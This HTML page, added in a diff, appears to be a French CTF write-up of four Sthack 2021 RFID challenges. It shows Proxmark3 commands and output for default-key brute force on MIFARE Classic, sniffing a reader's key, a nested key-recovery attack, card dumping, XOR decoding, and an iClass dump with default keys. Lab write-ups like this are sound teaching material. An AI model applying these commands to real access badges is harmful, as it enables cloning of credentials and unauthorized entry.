@@ -1,0 +1,436 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>RFID</title>
+<link rel="stylesheet" href="/assets/css/styles.css">
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ" crossorigin="anonymous">
+
+    <link rel="stylesheet" type="text/css" href="/assets/css/monokai.css">
+  </head>
+  <body data-bs-theme="dark">
+    <header class="d-flex py-3 mb-4 border-bottom" style="align-items: center; justify-content: space-around;">
+    <a href="/" class="d-flex align-items-center text-dark text-decoration-none">
+      <span class="fs-4"><span class="logo1">Hack</span><span class="logo2">vens</span></span>
+    </a>
+    <button id="btnSwitch" class="">💡/🌙</button>
+    <script defer="defer">
+      document.getElementById('btnSwitch').addEventListener('click',()=>{
+      if (document.body.getAttribute('data-bs-theme') == 'dark') {
+          document.body.setAttribute('data-bs-theme','light')
+          document.documentElement.style.setProperty("--logo-color1", "#161616")
+      }
+      else {
+          document.body.setAttribute('data-bs-theme','dark')
+          document.documentElement.style.setProperty("--logo-color1", "#fff")
+
+      }
+      })
+    </script>
+  </header>
+    <div class="container">
+     <div class="post">
+    <div class="post__back">
+    	<a href="/">&lt;-- home</a>
+    </div>
+    <div class="post__title">
+    	<h1>Sthack 2021 / RFID</h1>
+	<i>October 15, 2021</i>
+    </div>
+    <div class="post__meta">
+    	<p></p>
+    </div>
+    <div class="post__content"?>
+        <p>Pour cette nouvelle édition de la StHack, la <strong>R</strong>adio <strong>F</strong>requency <strong>ID</strong>entification était au rendez vous ! Quatre challenges basés sur des tags avec diverses technologies étaient disponibles ainsi qu’un <a href="https://proxmark.com/">Proxmark 3</a>. 
+Une conférence a été présentée par <a href="https://twitter.com/ArnC_CarN">@arnC</a> qui nous a donné un aperçu des différentes technologies et vulnérabilités qui ont été exploitées dans le passé.</p>
+
+<p>Il est donc l’auteur de ces quatre challenges.</p>
+
+<h1 id="challenge-1--baby-rfid">Challenge 1 : Baby RFID</h1>
+
+<p>La seule indication pour ce challenge était “Identifiant du badge est le flag !”</p>
+
+<h2 id="identification-du-tag">Identification du tag</h2>
+
+<p>La première étape est donc l’identification du badge, pour cela nous allons identifier la technologie utilisée grâce au Proxmark3 (PM3) mis à disposition.</p>
+
+<p>Nous commençons donc placer notre tag sur l’antenne High Frequency (<strong>HF</strong>) du PM3.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[usb] pm3 --&gt; hf search
+ 🕕  Searching for FeliCa tag...
+ [=] You can cancel this operation by pressing the pm3 button
+[!] ⚠️  No known/supported 13.56 MHz tags found
+</code></pre></div></div>
+
+<p>Aucune technologie identifiée, nous plaçons donc notre bagde sur l’antenne Low Frenquency (<strong>LF</strong>) :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[usb] pm3 --&gt; lf search
+[=] NOTE: some demods output possible binary
+[=] if it finds something that looks like a tag
+[=] False Positives ARE possible
+[=] 
+[=] Checking for known tags...
+[=] 
+[+] EM 410x ID 514C343734
+[+] EM410x ( RF/64 )
+[...]
+</code></pre></div></div>
+
+<p>Cette fois-ci, le tag est bien détecté et l’identifiant du badge est affiché.</p>
+
+<h2 id="résolution-de-lépreuve">Résolution de l’épreuve</h2>
+
+<p>Le flag pour ce premier challenge est donc l’identifiant du tag, c’est à dire <strong>514C343734</strong></p>
+
+<h1 id="challenge-2--mifare-warfare---1">Challenge 2 : Mifare Warfare - 1</h1>
+
+<h2 id="identification-du-tag-1">Identification du tag</h2>
+
+<p>Comme pour le premier challenge, nous identifions la technologie utilisée :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[usb] pm3 --&gt; hf search
+ 🕐  Searching for ISO14443-A tag...          
+[+]  UID: BA 14 DD 19 
+[+] ATQA: 00 04
+[+]  SAK: 08 [2]
+[+] Possible types:
+[+]    MIFARE Classic 1K
+[=] proprietary non iso14443-4 card found, RATS not supported
+[+] Magic capabilities : Gen 1a
+[+] Prng detection: weak
+
+
+[+] Valid ISO 14443-A tag found
+</code></pre></div></div>
+
+<p>Cette fois-ci, le tag utilise la norme ISO 14443-A, et semble être identifié comme étant du MIFARE Classic 1.</p>
+
+<h2 id="tentative-dattaque">Tentative d’attaque</h2>
+
+<p>Pour effectuer un dump/sim/clone, il est néccesaire d’avoir au moins une clé d’un secteur pour ensuite essayer de casser les autres via des attaques connues (nested, hardnested, staticnested, etc). Nous essayons alors dans un premier temps de faire une attaque par bruteforce avec les clés par défauts utilisées par les fournisseurs :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[usb] pm3 --&gt; hf mf fchk
+[+] No key specified, trying default keys
+[ 0] ffffffffffff
+[ 1] 000000000000
+[ 2] a0a1a2a3a4a5
+[ 3] b0b1b2b3b4b5
+[ 4] c0c1c2c3c4c5
+[ 5] d0d1d2d3d4d5
+[ 6] aabbccddeeff
+[ 7] 1a2b3c4d5e6f
+[ 8] 123456789abc
+[ 9] 010203040506
+[10] 123456abcdef
+[11] abcdef123456
+[12] 4d3a99c351dd
+[13] 1a982c7e459a
+[14] d3f7d3f7d3f7
+[15] 714c5c886e97
+[16] 587ee5f9350f
+[17] a0478cc39091
+[18] 533cb6c723f6
+[19] 8fd0a4f256e9
+[20] 0000014b5c31
+[21] b578f38a5c61
+[22] 96a301bce267
+[=] Running strategy 1
+[=] Chunk 2,2s | found 0/32 keys (23)
+[=] Running strategy 2
+[=] .
+[=] Chunk 3,9s | found 0/32 keys (23)
+[=] time in checkkeys (fast) 6,1s
+
+[!] ⚠️  No keys found
+</code></pre></div></div>
+
+<p>Aucune clé n’a été trouvée, nous essayons alors avec un dictionnaire personnalisé contenant 1205 clés les plus souvent utilisées :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[usb] pm3 --&gt; hf mf fchk -f extented
+[-] ⛔ Error - can't find `extented.dic`
+[usb] pm3 --&gt; hf mf fchk -f extended
+[+] Loaded 1205 keys from extended
+[=] Running strategy 1
+[=] Chunk 1,0s | found 0/32 keys (85)
+[=] Chunk 1,0s | found 0/32 keys (85)
+[=] Chunk 1,0s | found 0/32 keys (85)
+[=] Chunk 1,0s | found 0/32 keys (85)
+[=] Chunk 1,0s | found 0/32 keys (85)
+[=] Chunk 1,0s | found 0/32 keys (85)
+[=] Chunk 1,0s | found 0/32 keys (85)
+[=] Chunk 1,0s | found 0/32 keys (85)
+[=] Chunk 1,0s | found 0/32 keys (85)
+[=] Chunk 1,0s | found 0/32 keys (85)
+[=] Chunk 1,0s | found 0/32 keys (85)
+[=] Chunk 1,0s | found 0/32 keys (85)
+[=] Chunk 1,0s | found 0/32 keys (85)
+[=] Chunk 1,0s | found 0/32 keys (85)
+[=] Chunk 0,3s | found 0/32 keys (15)
+[=] Running strategy 2
+[=] ......
+[=] Chunk 14,0s | found 0/32 keys (85)
+[...]
+[=] Chunk 14,0s | found 0/32 keys (85)
+[=] .
+[=] Chunk 2,6s | found 0/32 keys (15)
+[=] time in checkkeys (fast) 212,4s
+
+[!] ⚠️  No keys found
+
+</code></pre></div></div>
+
+<p>La encore, aucune clé n’a été découverte.</p>
+
+<h2 id="solution-1">Solution 1</h2>
+
+<p>La première solution, est “fastidieuse”  mais permet à coup sûr d’obtenir les clés des secteurs. Pour cela il est possible simuler un badge avec un identifiant (UID) connu par le lecteur et d’analyser les communications lors du passage du proxmark. Le lecteur va alors tenter alors d’aller lire le contenu d’un secteur à partir d’une clé qui pourra etre intercepté :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[usb] pm3 --&gt; hf mf sim -x -i --1k -u BA14DD19
+[=] MIFARE 1K | 4 byte UID  BA 14 DD 19 
+[=] Options [ numreads: 0, flags: 291 (0x123) ]
+[=] Press pm3-button or send another cmd to abort simulation
+[#] ----------- BREAKING ----------
+[#] Emulator stopped. Tracing: 1  trace length: 0 
+[#] Enforcing Mifare 1K ATQA/SAK
+[#] 4B UID: ba14dd19
+[#] ATQA  : 00 04
+[#] SAK   : 08
+[#] Collected two pairs of AR/NR which can be used to extract keyB from reader for sector 0:
+[#] ../tools/mfkey/mfkey32v2 ba14dd19 acb5df53 a4949717 0d34090a 5e31a87a c4a60a98 0152409a
+[#] Emulator stopped. Tracing: 1  trace length: 26696
+[=] Reader is trying authenticate with: Key B, sector 00: [7bee4b2f110d]
+</code></pre></div></div>
+
+<p>A partir d’une clé A/B d’un secteur il est alors possible d’effectuer une “Nested Attack” pour retrouver toutes les autres :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[usb] pm3 --&gt; hf mf nested --1k --blk 0 -b -k 7bee4b2f110d --dump
+[+] Testing known keys. Sector count 16
+[=] ..
+[=] Chunk 4,1s | found 1/32 keys (24)
+[+] Time to check 23 known keys: 4 seconds
+
+[+] enter nested key recovery
+[+] Found 2 key candidates
+
+[+] target block:   0 key type: A  -- found valid key [ DCD69A2DE627 ]
+
+[=] Chunk 0,4s | found 1/32 keys (1)
+[+] Found 1 key candidates
+
+[+] target block:   4 key type: A  -- found valid key [ 14A2221996B4 ]
+[...]
+[+] found keys:
+
+[+] |-----|----------------|---|----------------|---|
+[+] | Sec | key A          |res| key B          |res|
+[+] |-----|----------------|---|----------------|---|
+[+] | 000 | dcd69a2de627   | 1 | 7bee4b2f110d   | 1 |
+[+] | 001 | 14a2221996b4   | 1 | e4373d5e6268   | 1 |
+[+] | 002 | 9922ebf0263f   | 1 | f8b92684786f   | 1 |
+[+] | 003 | d899c5f31408   | 1 | 366cb457ead4   | 1 |
+[+] | 004 | 0f162e7bee9d   | 1 | 71f07ce72e1c   | 1 |
+[+] | 005 | 67498dff59f3   | 1 | 0508577c8572   | 1 |
+[+] | 006 | 61e8236e9968   | 1 | 275ca8d78257   | 1 |
+[+] | 007 | 4a6f5d76c161   | 1 | 5d53c6b5ec59   | 1 |
+[+] | 008 | aa778eac90fe   | 1 | fa1e30c107b7   | 1 |
+[+] | 009 | fcd2b7fcb222   | 1 | 15519e9442bb   | 1 |
+[+] | 010 | a9a940086ea3   | 1 | 13a5a8357142   | 1 |
+[+] | 011 | 4216c27fe9d9   | 1 | 797c1e2c8d6f   | 1 |
+[+] | 012 | 22e0e149ce2b   | 1 | b9dd23d5fd49   | 1 |
+[+] | 013 | 7bb1f3867d55   | 1 | 870f15889001   | 1 |
+[+] | 014 | 4f1eadb0edb5   | 1 | 08be24c123c6   | 1 |
+[+] | 015 | a3683c6fbaf9   | 1 | e9ee759ed67e   | 1 |
+[+] |-----|----------------|---|----------------|---|
+[+] ( 0:Failed / 1:Success )
+
+[+] Generating binary key file
+[+] Found keys have been dumped to hf-mf-BA14DD19-key.bin
+
+</code></pre></div></div>
+
+<p>Toutes les clés de tous les secteurs ont été trouvées, nous pouvons alors effectuer un dump du badge</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[usb] pm3 --&gt; hf mf dump --1k -k hf-mf-BA14DD19-key.bin
+[=] Using `hf-mf-BA14DD19-key.bin`
+[=] Reading sector access bits...
+[=] .................
+[+] Finished reading sector access bits
+[=] Dumping all blocks from card...
+[+] successfully read block  0 of sector  0.
+[...]
+[+] successfully read block  3 of sector 15.
+[+] time: 7 seconds
+
+
+[+] Succeeded in dumping all blocks
+
+[+] saved 1024 bytes to binary file hf-mf-BA14DD19-dump.bin
+[+] saved 64 blocks to text file hf-mf-BA14DD19-dump.eml
+[+] saved to json file hf-mf-BA14DD19-dump.json
+</code></pre></div></div>
+
+<p>Nous pouvons alors lire le contenu du dump :</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; hexdump hf-mf-BA14DD19-dump-4.bin -C
+00000000  ba 14 dd 19 6a 08 04 00  46 59 25 58 49 10 23 02  |....j...FY%XI.#.|
+00000010  01 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+00000020  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+00000030  dc d6 9a 2d e6 27 7f 07  88 00 7b ee 4b 2f 11 0d  |...-.'....{.K/..|
+00000040  48 65 72 65 20 69 73 20  61 20 66 6c 61 67 3a 20  |Here is a flag: |
+00000050  73 74 68 61 63 6b 7b 73  6e 31 66 66 5f 6d 33 5f  |sthack{sn1ff_m3_|
+00000060  31 6d 5f 66 34 6d 30 75  73 21 7d 00 00 00 00 00  |1m_f4m0us!}.....|
+00000070  14 a2 22 19 96 b4 7f 07  88 00 e4 37 3d 5e 62 68  |.."........7=^bh|
+00000080  26 03 2c ad 36 1c 3f b4  65 05 1b af 64 07 2c ff  |&amp;.,.6.?.e...d.,.|
+00000090  27 28 75 bf 0a 01 77 be  2c 28 27 fc 38 1a 74 a2  |'(u...w.,('.8.t.|
+000000a0  0a 46 2a 93 36 43 36 a8  26 0a 44 cc 55 77 44 cc  |.F*.6C6.&amp;.D.UwD.|
+000000b0  99 22 eb f0 26 3f 7f 07  88 00 f8 b9 26 84 78 6f  |."..&amp;?......&amp;.xo|
+000000c0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+</code></pre></div></div>
+
+<p>Le flag est donc <strong>sthack{sn1ff_m3_1m_f4m0us!}</strong></p>
+
+<h2 id="solution-2">Solution 2</h2>
+
+<p>Cette solution alternative n’était pas celle attendue et elle a été rendu possible uniquement par l’utilisation d’un tag “magic gen1” AKA “UID modifiable”. Avec ce type de badge, l’attaque précédente n’est pas obligatoire et il est possible de lire un dump sans casser de clé.</p>
+
+<p>En effet, lors de la phase d’identification du badge, nous avons noté la présence de “Magic capabilities” :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[usb] pm3 --&gt; hf search
+[...]
+[+] Magic capabilities : Gen 1a
+[...]
+</code></pre></div></div>
+
+<p>Avec ce type de carte, il est possible malgré tout de lire le contenu du badge sans le moindre cassage de clé :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[usb] pm3 --&gt; hf mf cview                     
+[+] View magic Gen1a MIFARE Classic 1K
+[=] .................................................................
+
+[=] ----+-------------------------------------------------+-----------------
+[=] blk | data                                            | ascii
+[=] ----+-------------------------------------------------+-----------------
+[=]   0 | BA 14 DD 19 6A 08 04 00 46 59 25 58 49 10 23 02 | ....j...FY%XI.#.
+[=]   1 | 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 
+[=]   2 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 
+[=]   3 | DC D6 9A 2D E6 27 7F 07 88 00 7B EE 4B 2F 11 0D | ...-.'....{.K/..
+[=]   4 | 48 65 72 65 20 69 73 20 61 20 66 6C 61 67 3A 20 | Here is a flag:  
+[=]   5 | 73 74 68 61 63 6B 7B 73 6E 31 66 66 5F 6D 33 5F | sthack{sn1ff_m3_ 
+[=]   6 | 31 6D 5F 66 34 6D 30 75 73 21 7D 00 00 00 00 00 | 1m_f4m0us!}..... 
+[=]   7 | 14 A2 22 19 96 B4 7F 07 88 00 E4 37 3D 5E 62 68 | .."........7=^bh
+[=]   8 | 26 03 2C AD 36 1C 3F B4 65 05 1B AF 64 07 2C FF | &amp;.,.6.?.e...d.,. 
+[=]   9 | 27 28 75 BF 0A 01 77 BE 2C 28 27 FC 38 1A 74 A2 | '(u...w.,('.8.t. 
+[=]  10 | 0A 46 2A 93 36 43 36 A8 26 0A 44 CC 55 77 44 CC | .F*.6C6.&amp;.D.UwD. 
+[=]  11 | 99 22 EB F0 26 3F 7F 07 88 00 F8 B9 26 84 78 6F | ."..&amp;?......&amp;.xo
+[=]  12 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 
+[...]
+</code></pre></div></div>
+
+<p>Le flag est donc <strong>sthack{sn1ff_m3_1m_f4m0us!}</strong></p>
+
+<h1 id="challenge-3--mifare-warfare---2">Challenge 3 : Mifare Warfare - 2</h1>
+
+<p>L’indice de départ était “le badge précédent n’a pas livré tous ses secrets”</p>
+
+<p>En effet, le secteur 2 (identifié par les blocs 8,9,10 et 11) semble contenir des données qui ne nous ont pas servi pour le challenge précédent et tous les autres secteurs sont vides.</p>
+
+<p>Nous avons alors orienté nos tests sur les données du second secteur. Pour rapel, la technologie MIFARE 1K Possèdent 16 Secteurs contenant 4 blocs. Parmi ces 4 blocs, un est nommé le “sector trailer”, il contient une clé A sur 6 octets, puis 4 octets de conditions (Access Bits) d’accès, suivi de nouveau d’une clé B sur 6 octets également.</p>
+
+<p>Nous avons donc finalement que 3 blocs de données à décoder :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>26032cad361c3fb465051baf64072cff
+272875bf0a0177be2c2827fc381a74a2
+0a462a93364336a8260a44cc557744cc
+</code></pre></div></div>
+
+<p>Comme présenté lors de la conférence animée par arnC, les fournisseurs ont souvent tendance à effectuer un encodage de type “XOR” avec une clé pour “sécuriser” les données.</p>
+
+<p>La clé étant stockée sur le badge, nous avons alors utilisé les 4 derniers octets (<strong>557744cc</strong>) pour tenter de décoder le message :</p>
+
+<p>26032cad361c3fb465051baf64072cff272875bf0a0177be2c2827fc381a74a20a462a93364336a8260a44cc557744cc</p>
+
+<p>Un bruteforce sur la clé utilisée pour le XOR aurait egalement pu etre effectué à l’aide du site <a href="https://www.dcode.fr/chiffre-xor">dcode.fr</a></p>
+
+<p>Cela nous permet alors de retrouver le flag : <strong>sthack{x0r_c1ph3r_1s_v3ry_c0mm0n_1n_c4rds}</strong></p>
+
+<h1 id="challenge-4--trouver-le-flag-dans-le-badge">Challenge 4 : Trouver le flag dans le badge</h1>
+
+<h2 id="identification-du-tag-2">Identification du tag</h2>
+
+<p>L’identification du type de tag a pu être effectuée avec la commande suivante :</p>
+
+<p><code class="language-plaintext highlighter-rouge">[usb] pm3 --&gt; hf search</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[usb] pm3 --&gt; hf search
+ 🕔  Searching for iCLASS / PicoPass tag...   
+[+] iCLASS / Picopass CSN: 10 97 83 7B F7 FF 12 E0 
+
+[+] Valid iCLASS tag / PicoPass tag found
+
+ 🕐  Searching for FeliCa tag...[=] 
+ You can cancel this operation by pressing the pm3 button
+</code></pre></div></div>
+
+<p>Nous avons alors identifié un tag de type iClass. Pour cette technologie, des clés par défauts sont très souvent utilisées :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[usb] pm3 --&gt; hf iclass managekeys -p
+
+[=] idx| key
+[=] ---+------------------------
+[=]  0 | AE A6 84 A6 DA B2 32 78 
+[=]  1 | 76 65 54 43 32 21 10 00 
+[=]  2 | F0 E1 D2 C3 B4 A5 96 87 
+[=]  3 |
+[=]  4 |
+[=]  5 |
+[=]  6 |
+[=]  7 |
+[=] ---+------------------------
+</code></pre></div></div>
+
+<p>Ci-dessus, trois clés par défaut disponibles dans le proxmark, nous avons alors utilisé une d’entre elles pour dumper le tag :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[usb] pm3 --&gt; hf iclass dump --ki 0
+[+] Using AA1 (debit) key[0] AE A6 84 A6 DA B2 32 78 
+[=] Card has at least 2 application areas. AA1 limit 18 (0x12) AA2 limit 31 (0x1F)
+.
+
+[=]  block#  | data                    | ascii    |lck| info
+[=] ---------+-------------------------+----------+---+--------------
+[=]   0/0x00 | 10 97 83 7B F7 FF 12 E0 | ...{.... |   | CSN 
+[=]   1/0x01 | 12 FF FF FF 7F 1F FF 3C | .......&lt; |   | Config 
+[=]   2/0x02 | FE FF FF FF FF FF FF FF | ........ |   | E-purse 
+[=]   3/0x03 | EC 17 27 73 F6 4C 04 07 | ..'s.L.. |   | Debit 
+[=]   4/0x04 | FF FF FF FF FF FF FF FF | ........ |   | Credit 
+[=]   5/0x05 | FF FF FF FF FF FF FF FF | ........ |   | AIA 
+[=]   6/0x06 | 03 03 03 03 00 03 E0 17 | ........ |   | User 
+[=]   7/0x07 | E0 0F DF 43 C2 80 F8 86 | ...C.... |   | User 
+[=]   8/0x08 | 2A D4 C8 21 1F 99 68 71 | *..!..hq |   | User 
+[=]   9/0x09 | 2A D4 C8 21 1F 99 68 71 | *..!..hq |   | User 
+[=]  10/0x0A | 73 74 68 61 63 6B 7B 6C | sthack{l |   | User 
+[=]  11/0x0B | 5F 31 63 6C 34 35 35 5F | _1cl455_ |   | User 
+[=]  12/0x0C | 34 5F 44 34 6C 6C 34 35 | 4_D4ll45 |   | User 
+[=]  13/0x0D | 7D 00 00 00 00 00 00 00 | }....... |   | User 
+[=]  14/0x0E | FF FF FF FF FF FF FF FF | ........ |   | User 
+[=]  15/0x0F | FF FF FF FF FF FF FF FF | ........ |   | User 
+[=]  16/0x10 | FF FF FF FF FF FF FF FF | ........ |   | User 
+[=]  17/0x11 | FF FF FF FF FF FF FF FF | ........ |   | User 
+[=]  18/0x12 | FF FF FF FF FF FF FF FF | ........ |   | User 
+[=] ---------+-------------------------+----------+---+--------------
+
+[+] saving dump file - 19 blocks read
+[+] saved 152 bytes to binary file hf-iclass-1097837BF7FF12E0-dump.bin
+[+] saved 19 blocks to text file hf-iclass-1097837BF7FF12E0-dump.eml
+[+] saved to json file hf-iclass-1097837BF7FF12E0-dump.json
+</code></pre></div></div>
+
+<h2 id="résolution-de-lépreuve-1">Résolution de l’épreuve</h2>
+
+<p>L’analyse du dump nous permet alors de retrouver le flag : <strong>sthack{l_1cl455_4_D4ll45}</strong></p>
+
+    </div>
+</div>
+
+
+    </div>
+  </body>
+</html>
